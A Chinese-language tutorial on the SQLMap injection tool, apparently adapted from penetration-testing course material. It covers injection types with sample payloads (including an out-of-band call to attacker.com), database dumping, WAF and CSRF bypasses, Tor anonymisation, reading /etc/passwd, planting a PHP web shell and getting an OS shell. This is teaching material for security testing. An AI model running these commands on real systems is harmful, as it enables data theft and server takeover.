
## SQLMap

> [SQLMap](https://github.com/sqlmapproject/sqlmap)是一款用 Python 编写的工具，可以自动检测和利用 SQL 注入漏洞。

先让我们看看支持的注入类型：

```shell
sqlmap -hh

 ......
  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
 ......
```

其中，支持的技术`BEUSTQ`的含义如下：

- `B`：基于布尔值的盲注
- `E`：基于错误
- `U`：基于联合查询
- `S`：堆叠查询
- `T`：基于时间的盲注
- `Q`：内联查询

# SQL Injection 类型

## 基于布尔的盲注 SQL 注入

**基于布尔的盲注 SQL 注入示例:**
```sql
AND 1=1
```

SQLMap 通过区分 TRUE 和 FALSE 查询结果来利用基于布尔的盲注 SQL 注入漏洞，每次请求有效检索 1 字节信息。这种区分基于比较服务器响应，以确定 SQL 查询返回的是 TRUE 还是 FALSE。比较方法包括原始响应内容的模糊比较、HTTP 状态码、页面标题、过滤文本等多种因素。

- **TRUE 结果**：通常基于响应与常规服务器响应没有差异或差异极小
- **FALSE 结果**：基于响应与常规服务器响应有显著差异

基于布尔的盲注 SQL 注入被认为是 Web 应用程序中最常见的 SQLi 类型。

## 基于错误的 SQL 注入

**基于错误的 SQL 注入示例:**
```sql
AND GTID_SUBSET(@@version,0)
```

如果数据库管理系统 (DBMS) 的错误作为服务器响应的一部分返回，那么这些错误可能被用来携带查询结果。在这种情况下，会使用针对当前 DBMS 的特殊 payload，目标是导致已知错误行为的函数。

基于错误的 SQLi 比其他类型更快（除了基于 UNION 查询的类型），因为它可以通过每个请求检索有限数量（如 200 字节）的数据块。

## 基于 UNION 查询的注入

**基于 UNION 查询的注入示例:**
```sql
UNION ALL SELECT 1,@@version,3
```

通过使用 UNION，通常可以扩展原始（易受攻击的）查询，加入注入语句的结果。这样，如果原始查询结果作为响应的一部分被渲染，攻击者可以在页面响应中获得注入语句的附加结果。这种类型的 SQL 注入被认为是最快的，因为在理想情况下，攻击者可以通过单个请求获取整个目标数据库表的内容。

## 堆叠查询注入

**堆叠查询注入示例:**
```sql
; DROP TABLE users
```

堆叠 SQL 查询，也称为"piggy-backing"，是在易受攻击的查询之后注入额外 SQL 语句的形式。如果需要运行非查询语句（如 INSERT、UPDATE 或 DELETE），易受攻击的平台必须支持堆叠（例如，Microsoft SQL Server 和 PostgreSQL 默认支持）。SQLMap 可以使用这类漏洞来运行非查询语句，执行高级功能（例如，操作系统命令执行）和类似于基于时间的盲注 SQLi 类型的数据检索。

## 基于时间的盲注 SQL 注入

**基于时间的盲注 SQL 注入示例:**
```sql
AND 1=IF(2>1,SLEEP(5),0)
```

基于时间的盲注 SQL 注入原理类似于基于布尔的盲注 SQL 注入，但这里使用响应时间作为区分 TRUE 或 FALSE 的依据。

- **TRUE 响应**：通常表现为响应时间与常规服务器响应相比有明显差异
- **FALSE 响应**：响应时间应与常规响应时间无法区分

基于时间的盲注 SQL 注入比基于布尔的盲注 SQLi 慢得多，因为导致 TRUE 的查询会延迟服务器响应。这种 SQLi 类型在基于布尔的盲注 SQL 注入不适用的情况下使用。例如，当易受攻击的 SQL 语句是非查询（如 INSERT、UPDATE 或 DELETE），作为辅助功能的一部分执行，而不会影响页面渲染过程时，就会出于必要使用基于时间的 SQLi，因为这种情况下基于布尔的盲注 SQL 注入无法正常工作。

## 内联查询注入

**内联查询注入示例:**
```sql
SELECT (SELECT @@version) from
```

这种注入类型在原始查询中嵌入了一个查询。这种 SQL 注入不常见，不过，SQLMap 也支持这种 SQLi。

## 带外 SQL 注入

**带外 SQL 注入示例:**
```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

这被认为是最高级的 SQLi 类型之一，用于易受攻击的 Web 应用程序不支持其他类型或其他类型太慢（例如，基于时间的盲注 SQLi）的情况。SQLMap 通过"DNS 渗透"支持带外 SQLi，其中请求的查询通过 DNS 流量检索。

通过在控制域（如 .attacker.com）的 DNS 服务器上运行 SQLMap，SQLMap 可以通过强制服务器请求不存在的子域（如 foo.attacker.com）执行攻击，其中 foo 将是我们想要接收的 SQL 响应。SQLMap 然后可以收集这些错误的 DNS 请求，提取 foo 部分，以形成完整的 SQL 响应。

## SQLMap入门

查看所有选项，使用以下命令。如果只需要简略的版本，一个`h`即可。

```shell
sqlmap -hh
```

### 易受攻击的 PHP 代码示例

```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

由于易受攻击的 SQL 查询开启了错误报告，在 SQL 查询执行出现问题时，数据库错误会作为 Web 服务器响应的一部分返回。这种情况下更容易检测到 SQLi，尤其是在手动修改参数值时，因为返回的错误很容易被识别。

### 测试

SQLMap 的最一般的命令如下：

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

`--batch --dump` 自动转储所有数据。


```
### curl命令

针对带有参数的 Web 请求，正确设置 SQLMap 请求的方法之一是利用`Copy as cURL`。

![网络面板显示对 www.example.com 的 GET 请求，状态为 404，以及带有“复制为 cURL”等选项的上下文菜单。](https://academy.hackthebox.com/storage/modules/58/M5UVR6n.png)

粘贴到命令行，并将原始命令更改`curl`为`sqlmap`，我们可以使用相同的`curl`命令来使用 SQLMap：

```shell
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

在向 SQLMap 提供测试数据时，必须有一个可以评估 SQLi 漏洞的参数值，或者用于自动查找参数的专门选项/开关（例如`--crawl`，`--forms`或`-g`）。

### GET/POST 请求

在最常见的场景中，GET 参数通过使用选项 `-u` 或 `--url` 提供，如前面的例子所示。

而对于测试 POST 数据，可以使用 `--data` 标志，如下所示：

```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

在这种情况下，POST 参数 `uid` 和 `name` 都会被测试是否存在 SQLi 漏洞。

### 指定特定参数

如果我们有明确的迹象表明参数 `uid` 容易受到 SQLi 漏洞的影响，我们可以使用 `-p uid` 将测试范围缩小到仅这个参数。

或者，我们可以在提供的数据中使用特殊标记 `*` 来标记要测试的参数，如下所示：

```bash
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

这样做会让 SQLMap 只测试标记了星号（`*`）的参数 `uid`。

### 完整HTTP请求

如果我们需要指定一个包含大量不同标头值和冗长 POST 正文的复杂 HTTP 请求，可以使用该`-r`标志。SQLMap 会使用文本文件中储存的请求内容。一般可以从Burp之类的代理应用程序捕获此类 HTTP 请求，并将其写入请求文件。总之，命令如下：

```shell
sqlmap -r req.txt
```

> 显然，在文件里也可以用星号来指定需要注入的参数。


### 自定义请求

如果需要自定义`cookie`，那么以下两种都可以：

```shell
sqlmap ... --cookie='PHPSESSID=a1b2c3'

sqlmap ... -H='Cookie:PHPSESSID=a1b2c3'
```

当然，`--host`，`--referer`之类的也一样。

此外，还有一个开关`--random-agent`，用于从内置的常规浏览器数据库中随机选择一个标头值。这是一个需要记住的重要开关，因为越来越多的防护解决方案会自动丢弃所有包含可识别的默认 `SQLMap User-agent `值的流量。虽然 SQLMap 默认仅针对 HTTP 参数，但也可以测试标头中的 SQLi 漏洞。最简单的方法是在标头值后指定“自定义”注入标记（例如`--cookie="id=1*"`）。同样的原则也适用于请求的任何其他部分。

最后，如果想要指定除`GET`和`POST`之外的替代 HTTP 方法（例如`PUT`），我们可以使用选项`--method`，如下所示：

```shell
sqlmap -u www.target.com --data='id=1' --method PUT
```

当然，除了最常见的表单数据`POST`样式（例如`id=1`），SQLMap 还支持 JSON 格式（例如`{"id":1}`）和 XML 格式（例如`<element><id>1</id></element>`）的 HTTP 请求。对这些格式的支持是以“宽松”的方式实现的。因此，对于参数值如何存储没有严格的限制。如果代码`POST`主体相对简洁，那么此选项`--data`就足够了。但是，对于复杂或较长的 POST 主体，我们可以再次使用该`-r`选项，传入请求文件。


## 查看错误

- 最常用的是`-parse-errors`， SQLMap 将自动打印错误，从而让我们清楚地了解问题可能是什么。
- `-t`选项将整个流量内容存储到输出文件中。该`/tmp/traffic.txt`文件现在包含所有已发送和已接收的 HTTP 请求。

```shell
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

- `-v`选项可以提高控制台输出的详细程度，`-v 6`选项将直接将所有错误和完整的 HTTP 请求。
- `--proxy`选项将整个流量重定向到（中间人攻击）代理（例如`Burp`）。这会将所有 SQLMap 流量路由到`Burp`，以便我们可以手动调查所有请求，重复执行这些请求。

## 枚举数据库

例如易受攻击目标的主机名 ( `--hostname`)、当前用户名 ( `--current-user`)、当前数据库名称 ( `--current-db`) 或密码哈希值 ( `--passwords`)。
如果之前已识别出 SQLi 漏洞，SQLMap 将跳过该检测，直接启动 DBMS 枚举过程。

枚举通常从检索基本信息开始：

- 数据库版本标志（开关`--banner`）
- 当前用户名（开关`--current-user`）
- 当前数据库名称（开关`--current-db`）
- 检查当前用户是否具有管理员权限（开关`--is-dba`）

```shell
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

找到当前数据库名称（例子为`testdb`）后，将通过使用`--tables`选项并使用指定数据库名称来检索表名称`-D testdb`，如下所示：

```shell
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

...SNIP...
[13:59:24] [INFO] fetching tables for database: 'testdb'
Database: testdb
[4 tables]
+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+
```

> 除了默认的 CSV 之外，我们还可以使用选项 `--dump-format` 将输出格式指定为 HTML 或 SQLite，以便我们稍后可以在 SQLite 环境中进一步调查数据库。

当处理具有许多列和/或行的大型表时，我们可以使用选项指定列（例如，仅`name`和`surname`列）`-C`，如下所示：

```shell
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

为了根据表中的序数缩小行数，我们可以使用和`--start`选项指定行`--stop`（例如，从第 2 个条目开始到第 3 个条目），如下所示：

```shell
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

如果需要根据已知`WHERE`条件检索某些行（例如`name LIKE 'f%'`），我们可以使用选项`--where`，如下所示：

```shell
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

使用 `--dump-all` 开关，则会检索所有数据库中的所有内容：

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --dump-all
```

排除系统数据库：在这种情况下，建议包含 `--exclude-sysdbs` 开关：

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --dump-all --exclude-sysdbs
```

这将指示 SQLMap 跳过系统数据库内容的检索，因为这些内容通常对渗透测试人员的兴趣不大。系统数据库往往包含数据库管理相关的元数据，而非应用程序的业务数据，因此在大多数渗透测试场景中不是主要目标。

### 完整枚举结构

`--schema`可以做到检索所有表的结构，让我们全面了解结构。

```shell
sqlmap -u "http://www.example.com/?id=1" --schema
```

### 搜索你感兴趣的内容

我们可以使用`--search`选项搜索感兴趣的数据库、表和列。此选项允许我们使用 运算符搜索标识符名称`LIKE`。例如，如果我们要查找所有包含关键字 `user`的表名

```shell
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

根据特定关键字`pass`搜索所有列名：

```shell
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

一旦我们确定了包含密码的表（例如`master.users`），我们就可以使用选项检索该表`-T

```shell
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

```shell
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```


## 攻击调优


在大多数情况下，SQLMap 只需提供目标详细信息就能正常运行。但也有选项可用于微调 SQLi 注入尝试，以帮助 SQLMap 在检测阶段。每个发送到目标的 payload 包含：

- **向量**（如 `UNION ALL SELECT 1,2,VERSION()`）：payload 的核心部分，携带要在目标执行的有用 SQL 代码
- **边界**（如 `<vector>-- -`）：前缀和后缀形式，用于将向量正确注入到易受攻击的 SQL 语句中

### 前缀/后缀

在某些罕见情况下，需要特殊的前缀和后缀值，而这些不在常规 SQLMap 运行范围内。
对于这类运行，可以使用 `--prefix` 和 `--suffix` 选项：

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

这会将所有向量值包含在静态前缀 `%'))` 和后缀 `-- -` 之间。
例如，如果目标上的易受攻击代码是：

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

向量 `UNION ALL SELECT 1,2,VERSION()`，加上前缀 `%'))` 和后缀 `-- -`，会在目标产生以下（有效的）SQL 语句：

```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

### 级别/风险设置

默认情况下，SQLMap 结合了一组预定义的最常见边界（即前缀/后缀对）以及在目标易受攻击情况下成功率高的向量。但用户可以使用更大的边界和向量集，这些已经整合到 SQLMap 中。

可以使用以下选项：

- **--level** 选项（1-5，默认为 1）：扩展所使用的向量和边界，基于它们的预期成功率（预期成功率越低，级别越高）
- **--risk** 选项（1-3，默认为 1）：基于它们在目标端造成问题的风险扩展使用的向量集（例如数据库条目丢失或拒绝服务的风险）

检查不同 `--level` 和 `--risk` 值使用的边界和 payload 之间差异的最佳方法是使用 `-v` 选项设置详细级别。

```bash
sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

在默认 `--level` 值下使用的 payload 边界集明显较小：

```bash
sqlmap -u www.example.com/?id=1 -v 3
```

### payload 数量

- 默认情况下（`--level=1 --risk=1`），用于测试单个参数的 payload 数量最多为 72
- 在最详细的情况下（`--level=5 --risk=3`），payload 数量增加到 7,865

由于 SQLMap 已经调优为检查最常见的边界和向量，建议一般用户不要修改这些选项，因为这会使整个检测过程变慢。然而，在特殊的 SQLi 漏洞情况下，如必须使用 OR payload（例如登录页面），我们可能需要自行提高风险级别。

这是因为 OR payload 在默认运行中本质上是危险的，特别是当基础易受攻击的 SQL 语句在积极修改数据库内容时（如 DELETE 或 UPDATE）。

### 高级调优

为进一步微调检测机制，SQLMap 提供了大量开关和选项：

#### 状态码

当处理大量动态内容的庞大目标响应时，可以使用 TRUE 和 FALSE 响应之间的细微差异进行检测。如果差异表现在 HTTP 代码中（如 TRUE 为 200，FALSE 为 500），可以使用 `--code` 选项固定 **TRUE** 响应的检测为特定 HTTP 代码：

```bash
--code=200
```

#### 标题

如果响应之间的差异可通过检查 HTTP 页面标题看出，可以使用 `--titles` 开关指示检测机制基于 HTML `<title>` 标签内容进行比较。

#### 字符串

如果 TRUE 响应中出现特定字符串值（如"success"）而 FALSE 响应中不存在，可以使用 `--string` 选项将检测仅基于该单个值的出现：

```bash
--string=success
```

#### 仅文本

处理大量隐藏内容（如某些 HTML 页面行为标签 `<script>`、`<style>`、`<meta>` 等）时，可以使用 `--text-only` 开关，它移除所有 HTML 标签，仅基于文本（即可见）内容进行比较。

#### 特定注入技术

在某些特殊情况下，需要将使用的 payload 仅限于某种类型。例如，如果基于时间的盲注 payload 导致响应超时问题，或者想强制使用特定 SQLi payload 类型，可以使用 `--technique` 选项指定 SQLi 技术。

比如，如果想跳过基于时间的盲注和堆叠 SQLi payload，只测试基于布尔的盲注、基于错误的和 UNION 查询 payload，可以指定这些技术：

```bash
--technique=BEU
```

#### UNION SQLi 调优

有时，`UNION SQLi payload `需要额外的用户提供信息才能工作：

- 如果能手动找到易受攻击的 SQL 查询的确切列数，可以使用 `--union-cols` 选项提供此数字：
  ```bash
  --union-cols=17
  ```

- 如果 SQLMap 使用的默认"虚拟"填充值（NULL 和随机整数）与易受攻击的 SQL 查询结果中的值不兼容，可以指定替代值：
  ```bash
  --union-char='a'
  ```

- 如果需要在 UNION 查询末尾使用 FROM <表> 形式的附录（如 Oracle 的情况），可以用 `--union-from` 选项设置：
  ```bash
  --union-from=users
  ```


## 绕过 Web 应用防护措施

### 反 CSRF 令牌绕过 (Anti-CSRF Token Bypass)

防御自动化工具使用的第一道防线之一是在所有 HTTP 请求中，特别是由 Web 表单填写产生的请求中，加入反 CSRF（即跨站请求伪造）令牌。

在这种情况下，每个 HTTP 请求都应该包含一个只有用户实际访问并使用了页面才能获得的有效令牌值。虽然最初的想法是防止恶意链接场景（仅仅打开这些链接就会对不知情的已登录用户产生不良后果，例如打开管理员页面并添加具有预定义凭据的新用户），但这个安全特性也无意中增强了应用程序对（不需要的）自动化的防护能力。

然而，SQLMap 提供了可以帮助绕过反 CSRF 防护的选项。其中最重要的选项是 **`--csrf-token`**。通过指定令牌参数名称，SQLMap 将自动尝试解析目标响应内容并搜索新的令牌值，以便在下一个请求中使用。

此外，即使在用户没有通过 `--csrf-token` 明确指定令牌名称的情况下，如果提供的某个参数包含任何常见的子字符串（即 `csrf`, `xsrf`, `token`），用户也会被提示是否要在后续请求中自动更新它：


```shell
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.9}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 22:18:01 /2020-09-18/

POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
```

### 唯一值绕过 (Unique Value Bypass)

在某些情况下，Web 应用程序可能只要求在预定义参数中提供唯一值。这种机制类似于上面描述的反 CSRF 技术，不同之处在于无需解析网页内容。因此，通过简单地确保每个请求对于预定义参数都有一个唯一值，Web 应用程序可以阻止 CSRF 尝试，同时也能阻止一些自动化工具。为此，应使用 **`--randomize`** 选项，指向包含应在发送前随机化的值的参数名称：


```shell
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
URI: http://www.example.com:80/?id=1&rp=99954
URI: http://www.example.com:80/?id=1&rp=87216
URI: http://www.example.com:80/?id=9030&rp=36456
URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689
URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049
URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
```

### 计算参数绕过

另一种类似的机制是 Web 应用程序期望基于其他参数值计算出正确的参数值。最常见的是，一个参数值必须包含另一个参数值的消息摘要（例如 `h=MD5(id)`）。为了绕过这一点，应使用 **`--eval`** 选项，在请求发送到目标之前，对有效的 Python 代码进行求值：


```shell
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
URI: http://www.example.com:80/?id=9061&h=4d7e0d72898ae7ea3593eb5ebf20c744
URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&h=620460a56536e2d32fb2f4842ad5a08d
URI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&h=db7c815825b14d67aaa32da09b8b2d42
URI: http://www.example.com:80/?id=1%29%20AND%209978%3D1232%20AND%20%284955%3D4955&h=02312acd4ebe69e2528382dfff7fc5cc
```

### IP 地址隐藏 

如果我们想隐藏我们的 IP 地址，或者某个 Web 应用程序有阻止当前 IP 地址的保护机制，我们可以尝试使用代理或匿名网络 Tor。可以使用 **`--proxy`** 选项设置代理（例如 `--proxy="socks4://177.39.187.70:33283"`），其中我们应该添加一个可用的代理。

此外，如果我们有一个代理列表，可以使用 **`--proxy-file`** 选项将其提供给 SQLMap。这样，SQLMap 将按顺序遍历列表，并在遇到任何问题（例如IP 地址被列入黑名单）时，就会跳过当前代理，使用列表中的下一个。另一种选择是使用 Tor 网络提供易于使用的匿名化，我们的 IP 可以出现在庞大的 Tor 出口节点列表中的任何位置。如果在本地机器上正确安装了 Tor，则在本地端口 9050 或 9150 应该有一个 SOCKS4 代理服务。通过使用 **`--tor`** 开关，SQLMap 将自动尝试找到本地端口并适当使用它。

如果我们想确保 Tor 被正确使用，我们可以使用 **`--check-tor`** 开关。在这种情况下，SQLMap 将连接到 `https://check.torproject.org/` 并检查响应是否包含预期的结果（即，其中出现 `Congratulations`）。

### WAF 绕过 

每当我们运行 SQLMap 时，作为初步测试的一部分，SQLMap 会使用一个不存在的参数名称（例如 `?pfov=...`）发送一个预定义的、看起来像恶意的 payload，以测试 WAF (Web Application Firewall) 的存在。如果在用户和目标之间存在任何防护措施，与原始响应相比，响应会发生显著变化。例如，如果部署了最流行的 WAF 解决方案之一 (ModSecurity)，此类请求后应该会收到 `406 - Not Acceptable` 响应。

如果检测到了WAF，为了识别实际的防护机制，SQLMap 使用第三方库 `identYwaf`，该库包含 80 种不同 WAF 解决方案的签名。如果我们想完全跳过这个启发式测试，我们可以使用 **`--skip-waf`** 开关。

### User-agent 黑名单绕过

如果在运行 SQLMap 时遇到问题（例如，一开始就出现 HTTP 错误代码 5XX），我们首先应该考虑的是 SQLMap 使用的默认 user-agent 是否可能被列入黑名单（例如 `User-agent: sqlmap/1.4.9 (http://sqlmap.org)`）。

这使用 **`--random-agent`** 开关很容易绕过，该开关会将默认的 user-agent 替换为从浏览器使用的大量值池中随机选择的值。

**注意:** 如果在运行期间检测到某种形式的防护，即使是其他安全机制，我们也可以预期目标会出问题。主要原因是此类防护措施在不断发展和改进，留给攻击者的操作空间越来越小。

## Tamper 脚本 (Tamper Scripts)

最后，SQLMap 中用于绕过 WAF/IPS 解决方案的最流行的机制之一是所谓的“篡改脚本”（tamper scripts）。篡改脚本是一种特殊的（Python）脚本，用于在请求发送到目标之前对其进行修改，大多数情况下是为了绕过某种防护。

例如，最流行的篡改脚本之一 `between` 将所有大于号 (>) 替换为 `NOT BETWEEN 0 AND #`，将等号 (=) 替换为 `BETWEEN # AND #`。这样，许多原始的防护机制（主要侧重于防止 XSS 攻击）很容易被绕过，至少对于 SQLi 目的而言是如此。

篡改脚本可以通过 **`--tamper`** 选项链式调用，一个接一个（例如 `--tamper=between,randomcase`），它们根据预定义的优先级运行。优先级的预定义是为了防止任何不必要的行为，因为有些脚本通过修改其 SQL 语法来修改 payload（例如 `ifnull2ifisnull`），而有些篡改脚本则不关心内部内容（例如 `appendnullbyte`）。

篡改脚本可以修改请求的任何部分，尽管大多数修改 payload 内容。最值得注意的篡改脚本如下：


|        **Tamper 脚本**        |                              **描述**                              |
| :-------------------------: | :--------------------------------------------------------------: |
|          `0eunion`          |                    将所有 `UNION` 替换为 `e0UNION`                     |
|       `base64encode`        |                 对给定的 payload 中的所有字符进行 Base64 编码                  |
|          `between`          | 将大于号 (>) 替换为 `NOT BETWEEN 0 AND #`，将等号 (=) 替换为 `BETWEEN # AND #` |
|      `commalesslimit`       |        将 (MySQL) 中的 `LIMIT M, N` 实例替换为 `LIMIT N OFFSET M`        |
|    `counterpartequalto`     |                     将所有等号 (=) 运算符替换为 `LIKE`                      |
| `halfversionedmorekeywords` |                     在每个关键字前添加 (MySQL) 版本化注释                      |
|   `modsecurityversioned`    |                    使用 (MySQL) 版本化注释将完整查询包围起来                     |
| `modsecurityzeroversioned`  |                    使用 (MySQL) 零版本化注释将完整查询包围起来                    |
|        `percentage`         |           在每个字符前面添加百分号 (%) (例如 SELECT -> %S%E%L%E%C%T)           |
|        `plus2concat`        |               将加号 (+) 运算符替换为 (MsSQL) 函数 `CONCAT()`               |
|        `randomcase`         |             将每个关键字字符替换为随机大小写值 (例如 SELECT -> SEleCt)              |
|       `space2comment`       |                       将空格字符 ( ) 替换为注释 `/`                        |
|        `space2dash`         |             将空格字符 ( ) 替换为破折号注释 (--) 后跟随机字符串和换行符 (\n)             |
|        `space2hash`         |         将 (MySQL) 中的空格字符 ( ) 替换为井号 (#) 后跟随机字符串和换行符 (\n)          |
|     `space2mssqlblank`      |             将 (MsSQL) 中的空格字符 ( ) 替换为来自有效备用字符集的随机空白字符             |
|        `space2plus`         |                       将空格字符 ( ) 替换为加号 (+)                        |
|     `space2randomblank`     |                  将空格字符 ( ) 替换为来自有效备用字符集的随机空白字符                   |
|      `symboliclogical`      |                将 AND 和 OR 逻辑运算符替换为其符号对应项 (&& 和 \|                |
|     `versionedkeywords`     |                   用 (MySQL) 版本化注释将每个非函数关键字包围起来                   |
|   `versionedmorekeywords`   |                    用 (MySQL) 版本化注释将每个关键字包围起来                     |

要获取所有已实现的篡改脚本的完整列表以及如上所示的描述，可以使用 **`--list-tampers`** 开关。我们还可以为任何自定义类型的攻击（如二阶 SQLi）开发自定义篡改脚本。

## 其他绕过 (Miscellaneous Bypasses)

在其他防护绕过机制中，还有两个需要提及。第一个是 **分块传输编码 (Chunked transfer encoding)**，使用 **`--chunked`** 开关开启，它将 POST 请求的主体分割成所谓的“块”（chunks）。被列入黑名单的 SQL 关键字被分散到不同的块中，这样包含它们的请求就可以不被注意地通过。

另一种绕过机制是 **HTTP 参数污染 (HTTP parameter pollution - HPP)**，与 `--chunked` 类似，payload 被分割到具有相同参数名的不同参数值中（例如 `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`），如果目标平台支持（例如 ASP），这些值会被连接起来。


## 进入操作系统

> 读取数据比写入数据更为常见，因为在现代 `DBMS` 中，写入数据需要严格的权限，因此可能导致系统漏洞利用，这一点我们将会看到。例如，在 `MySql` 中，要读取本地文件，数据库用户必须拥有`LOAD DATA`和 `INSERT`的权限，才能将文件内容加载到表中，然后读取该表。


```sql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
```

先检查是否具有管理员权限

```shell
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

如果很不幸没有，那么尝试去读取文件则不会读到数据。但是假如有，我们可以用SQLMap的选项读取：`--file-read`

```shell
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

### 写入本地文件

在现代数据库管理系统 (DBMS) 中，将文件写入托管服务器变得更加受限，因为我们可以利用这一点在远程服务器上写入 Web Shell，从而获得代码执行能力并控制服务器。

这就是为什么现代 DBMS 默认禁用文件写入，并且需要 DBA (数据库管理员) 具备某些权限才能写入文件。例如，在 MySQL 中，除了在主机服务器上需要本地访问权限（比如在我们需要写入的目录中拥有写入权限）之外，还必须手动禁用 `--secure-file-priv` 配置才能允许使用 `INTO OUTFILE` SQL 查询将数据写入本地文件。

尽管如此，许多 Web 应用程序仍然需要 DBMS 能够将数据写入文件，因此值得测试我们是否可以向远程服务器写入文件。使用 `SQLMap` 实现这一点，我们可以使用 `--file-write` 和 `--file-dest` 选项。首先，让我们准备一个基本的` PHP Web Shell `并将其写入一个 `shell.php` 文件：

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

现在，让我们尝试将此文件写入远程服务器的 `/var/www/html/` 目录，这是 Apache 的默认服务器 Web 根目录。如果我们不知道服务器的 Web 根目录，我们将看到 SQLMap 如何自动找到它。


```bash
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
        ___
       __H__ ___ ___[']_____ ___ ___  {1.4.11#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 17:54:18 /2020-11-19/

[17:54:19] [INFO] resuming back-end DBMS 'mysql'
[17:54:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] y

[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)

[*] ending @ 17:54:28 /2020-11-19/
```

我们看到 `SQLMap` 确认文件确实被写入了：

```
[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
```

现在，我们可以尝试访问远程 PHP shell 并执行一个示例命令：


```bash
curl http://www.example.com/shell.php?cmd=ls+-la
total 148
drwxrwxrwt 1 www-data www-data   4096 Nov 19 17:54 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
...SNIP...
```

我们看到我们的 PHP shell 确实被写入了远程服务器，并且我们对主机服务器拥有命令执行权限。

### 执行操作系统命令 

既然我们已经确认可以通过写入` PHP shell `来获得命令执行权限，我们可以测试 `SQLMap` 无需手动写入远程 shell 就能获得 `OS shell `的能力。`SQLMap` 利用各种技术通过 SQL 注入漏洞获取远程 shell，例如像我们刚才那样写入远程 `shell`，编写执行命令并检索输出的 SQL 函数，甚至使用一些直接执行` OS `命令的 `SQL` 查询，比如 `Microsoft SQL Server` 中的 `xp_cmdshell`。要使用 `SQLMap` 获取 `OS shell`，我们可以使用 `--os-shell` 选项，如下所示：

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
        ___
       __H__ ___ ___[.]_____ ___ ___  {1.4.11#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 18:02:15 /2020-11-19/

[18:02:16] [INFO] resuming back-end DBMS 'mysql'
[18:02:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
